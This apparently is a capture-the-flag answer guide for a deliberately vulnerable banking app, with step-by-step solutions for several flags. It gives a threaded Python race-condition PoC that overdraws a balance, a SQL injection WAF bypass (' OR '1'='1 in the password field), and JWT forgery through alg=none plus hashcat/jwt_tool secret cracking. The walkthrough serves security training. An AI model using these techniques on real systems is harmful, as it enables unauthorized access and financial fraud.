ATTACK 6 — Race Condition — Express Transfer (TOCTOU)            [FLAG 11]
  Vuln:    Balance check and deduction are not atomic. Concurrent requests
           can all pass the balance check before any deduction is recorded.
  Flag key: race_condition

  Starting balance: £1,000.00    Max transfer: £10,000

  STEP 1 — Log in as customer, go to /account/express-transfer
  STEP 2 — Send 10-20 simultaneous POST requests before the balance updates:

  Python PoC:
    import threading, requests

    BASE   = "http://TARGET"
    COOKIE = {"session": "CUSTOMER_SESSION"}

    def transfer():
        requests.post(BASE + "/api/v1/transfer/express",
                      data={"amount": "1000"}, cookies=COOKIE)

    threads = [threading.Thread(target=transfer) for _ in range(15)]
    for t in threads: t.start()
    for t in threads: t.join()

  Burp Suite — Turbo Intruder:
    Send POST /api/v1/transfer/express  (amount=1000) to Turbo Intruder
    Use the race condition template, set concurrentConnections=15, requests=15.

  When balance goes negative, server detects overdraft and returns FLAG 11
  in the JSON response:  {"success": false, "flag": "LYD{...}"}

EMPLOYEE LOGIN — SQL Injection (Medium difficulty — WAF on emp_id only)
  No flag here — this is just the door into Phase 4.

  The WAF filters these tokens on the emp_id field (case-insensitive):
    or   union   select   --   #   /*

  The emp_id field is protected. The password field has NO filter.

  Exploit SQL precedence:
    SQL:  WHERE emp_id='EMP_INPUT' AND password='PASS_INPUT'
    Goal: Make the WHERE clause always true using the password field.
    Inject in password:  ' OR '1'='1
    Result SQL:  WHERE emp_id='x' AND password='' OR '1'='1'
                 AND binds tighter than OR → evaluates as:
                 (emp_id='x' AND password='') OR TRUE  →  TRUE

  Form values:
    Employee ID:  x           (literally — any value)
    Password:     ' OR '1'='1

  You are now logged into the staff portal as sysadmin.
  Proceed to Phase 4.

ATTACK 9 — JWT Manipulation — API Portal                         [FLAG 6]
  Page:    /staff/api-portal
  Vuln:    JWT accepts alg=none (no signature) + weak HS256 secret
  Flag key: jwt
  Target:  GET /api/v2/corporate/vault  (requires role=admin in JWT payload)

  METHOD A — alg:none bypass (no secret needed):

    STEP 1: POST /api/v2/auth/token  → receive a valid JWT (role=employee)
    STEP 2: Split the JWT on dots:  header.payload.signature
    STEP 3: Base64url-decode header and payload, modify:
              header:  {"alg":"none","typ":"JWT"}
              payload: change "role": "employee"  →  "role": "admin"
    STEP 4: Base64url-encode both (no padding), join as:
              new_header.new_payload.    (empty signature, trailing dot kept)
    STEP 5: Use the token in the Vault panel.

    Python PoC:
      import base64, json

      def b64enc(d):
          return base64.urlsafe_b64encode(
              json.dumps(d, separators=(',',':')).encode()
          ).rstrip(b'=').decode()

      hdr     = b64enc({"alg": "none", "typ": "JWT"})
      payload = b64enc({"sub": "sysadmin", "role": "admin", "iss": "vbank"})
      token   = f"{hdr}.{payload}."
      print(token)

  METHOD B — crack HS256 secret, forge signed token:
    Secret:  vbank2024
    Crack:   hashcat -a 0 -m 16500 <jwt_token> rockyou.txt
             OR: python3 jwt_tool.py -C -d wordlist.txt <jwt_token>
    Forge:   python3 jwt_tool.py -S hs256 -p vbank2024 <jwt_token>
             (change role to admin in payload)

  FLAG 6 is returned in the vault response JSON.
